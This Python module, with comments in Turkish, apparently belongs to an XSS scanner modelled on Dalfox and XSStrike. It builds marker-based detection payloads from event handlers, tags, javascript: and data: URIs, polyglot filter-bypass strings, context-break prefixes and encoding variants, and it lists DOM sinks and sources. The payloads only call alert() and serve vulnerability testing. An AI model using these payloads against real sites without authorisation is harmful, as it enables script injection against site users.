"""Dalfox + XSStrike inspired XSS detection payloads — marker tabanlı tespit."""

import itertools

# Dalfox: event-handlers
EVENT_HANDLERS = [
    'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onblur',
    'onchange', 'onsubmit', 'onreset', 'onselect', 'onkeydown', 'onkeyup',
    'onkeypress', 'onmousedown', 'onmouseup', 'onmousemove', 'onmouseout',
    'onmouseenter', 'onmouseleave', 'ondblclick', 'oncontextmenu', 'oninput',
    'oninvalid', 'onsearch', 'ontoggle', 'onwheel', 'oncopy', 'oncut',
    'onpaste', 'onanimationstart', 'onanimationend', 'ontransitionend',
    'onpointerdown', 'onpointerup', 'onpointermove', 'onpointerover',
    'onpointerout', 'onpointerenter', 'onpointerleave', 'onauxclick',
    'onbeforeinput', 'onbeforecopy', 'onbeforecut', 'onbeforepaste',
    'onfullscreenchange', 'onhashchange', 'onmessage', 'onoffline',
    'ononline', 'onpagehide', 'onpageshow', 'onpopstate', 'onresize',
    'onstorage', 'onunload', 'onabort', 'oncanplay', 'oncanplaythrough',
    'oncuechange', 'ondurationchange', 'onemptied', 'onended', 'onloadeddata',
    'onloadedmetadata', 'onloadstart', 'onpause', 'onplay', 'onplaying',
    'onprogress', 'onratechange', 'onseeked', 'onseeking', 'onstalled',
    'onsuspend', 'onvolumechange', 'onwaiting', 'onbeforeunload',
    'onformchange', 'onforminput', 'onreadystatechange', 'onstart',
    'onfinish', 'onbounce', 'onfinish', 'onfilterchange', 'onpropertychange',
]

# Dalfox: useful-tags
USEFUL_TAGS = [
    'script', 'img', 'svg', 'iframe', 'object', 'embed', 'video', 'audio',
    'source', 'input', 'button', 'textarea', 'select', 'form', 'marquee',
    'details', 'summary', 'body', 'html', 'meta', 'link', 'base', 'style',
    'table', 'td', 'th', 'tr', 'div', 'span', 'a', 'p', 'h1', 'h2', 'h3',
    'math', 'mtext', 'annotation-xml', 'foreignObject', 'isindex', 'keygen',
    'xss', 'custom', 'animate', 'set', 'animateTransform',
]

# Dalfox: uri-scheme
URI_SCHEMES = [
    "javascript:alert({marker})",
    "javascript:alert`{marker}`",
    "javascript:confirm({marker})",
    "javascript:prompt({marker})",
    "data:text/html,<script>alert({marker})</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCh7bWFya2VyfSk8L3NjcmlwdD4=",
    "vbscript:msgbox({marker})",
]

# XSStrike polyglot / filter bypass patterns
POLYGLOT_PAYLOADS = [
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert({marker})//'>",
    "'\"-->]]>*/</script></style></title></textarea><img src=x onerror=alert({marker})>",
    "';alert(String.fromCharCode(88,83,83))//';alert({marker})//\";alert({marker})//",
    "\"><img src=x id={marker} onerror=alert({marker})>",
    "'><svg/onload=alert({marker})>",
    "\"><svg/onload=alert({marker})>",
    "'\"><svg/onload=alert({marker})>",
    "<img/src=x onerror=alert({marker})>",
    "<svg/onload=alert({marker})>",
    "<script>alert({marker})</script>",
    "<ScRiPt>alert({marker})</ScRiPt>",
    "<scr<script>ipt>alert({marker})</scr<script>ipt>",
    "<img src=x onerror=alert`{marker}`>",
    "<svg/onload=alert`{marker}`>",
    "<iframe srcdoc=\"<script>alert({marker})</script>\">",
    "<details open ontoggle=alert({marker})>",
    "<marquee onstart=alert({marker})>",
    "<input onfocus=alert({marker}) autofocus>",
    "<select onfocus=alert({marker}) autofocus>",
    "<textarea onfocus=alert({marker}) autofocus>",
    "<keygen onfocus=alert({marker}) autofocus>",
    "<video><source onerror=alert({marker})>",
    "<audio src=x onerror=alert({marker})>",
    "<body onload=alert({marker})>",
    "<object data=javascript:alert({marker})>",
    "<embed src=javascript:alert({marker})>",
    "<form action=javascript:alert({marker})><input type=submit>",
    "<isindex action=javascript:alert({marker})>",
    "<base href=javascript:alert({marker})//>",
    "<meta http-equiv=refresh content=0;url=javascript:alert({marker})>",
]

# Context break prefixes (XSStrike)
CONTEXT_PREFIXES = [
    "", "'", '"', "'>", '">', "'\"><", "\"><", "'\"-->", "-->", "]]>", "`",
    "' autofocus onfocus=alert({marker}) x='", '" autofocus onfocus=alert({marker}) x="',
    "'><", "\"><", "';alert({marker})//", '";alert({marker})//',
    "</script><script>alert({marker})</script>",
    "</title><script>alert({marker})</script>",
    "</textarea><script>alert({marker})</script>",
    "--><script>alert({marker})</script>",
]

# Encoded bypass variants (Dalfox encoders: url, html)
def _encode_variants(payload):
    variants = [payload]
    variants.append(payload.replace('<', '%3C').replace('>', '%3E'))
    variants.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
    variants.append(payload.replace('script', 'scr\x00ipt'))
    variants.append(payload.replace('script', 'scr%00ipt'))
    variants.append(payload.replace('alert', 'al\u0065rt'))
    variants.append(payload.replace('(', '%28').replace(')', '%29'))
    variants.append(payload.replace('onerror', 'ONERROR'))
    variants.append(payload.replace('onload', 'ONLOAD'))
    variants.append(payload.replace('svg', 'SvG'))
    variants.append(payload.replace('img', 'ImG'))
    return list(dict.fromkeys(variants))

def _gen_handler_payloads(marker):
    payloads = []
    for handler in EVENT_HANDLERS[:25]:
        for tag in ['img', 'svg', 'body', 'input', 'video', 'details', 'marquee']:
            payloads.append(f"<{tag} {handler}=alert({marker})>")
            payloads.append(f"<{tag}/{handler}=alert({marker})>")
    return payloads

def _gen_tag_payloads(marker):
    payloads = []
    for tag in USEFUL_TAGS[:20]:
        if tag in ('script',):
            payloads.append(f"<{tag}>alert({marker})</{tag}>")
        elif tag in ('img', 'audio', 'video', 'source'):
            payloads.append(f"<{tag} src=x onerror=alert({marker})>")
        elif tag == 'svg':
            payloads.append(f"<{tag}/onload=alert({marker})>")
        elif tag == 'iframe':
            payloads.append(f"<{tag} src=javascript:alert({marker})>")
    return payloads

def gen_xss_payloads(marker="1"):
    """Marker tabanlı XSS payload seti — yansıma tespiti için."""
    seen = set()
    marker_str = str(marker)

    for template in POLYGLOT_PAYLOADS + URI_SCHEMES:
        p = template.replace('{marker}', marker_str).replace('{marker}', marker_str)
        for v in _encode_variants(p):
            if v not in seen:
                seen.add(v)
                yield v

    for prefix in CONTEXT_PREFIXES:
        base = prefix.replace('{marker}', marker_str)
        for poly in POLYGLOT_PAYLOADS[:8]:
            p = base + poly.replace('{marker}', marker_str)
            for v in _encode_variants(p):
                if v not in seen:
                    seen.add(v)
                    yield v

    for p in _gen_handler_payloads(marker_str) + _gen_tag_payloads(marker_str):
        for v in _encode_variants(p):
            if v not in seen:
                seen.add(v)
                yield v

# DOM XSS göstergeleri (Dalfox static analysis hints)
DOM_SINKS = [
    'document.write', 'document.writeln', 'innerHTML', 'outerHTML',
    'eval(', 'setTimeout(', 'setInterval(', 'Function(', 'location.href',
    'location.replace', 'location.assign', 'window.open', 'document.cookie',
    'jQuery(', '$.html(', '$.append(', 'ReactDOM.render', 'dangerouslySetInnerHTML',
]

DOM_SOURCES = [
    'location.hash', 'location.search', 'location.href', 'document.URL',
    'document.documentURI', 'document.referrer', 'window.name', 'postMessage',
]
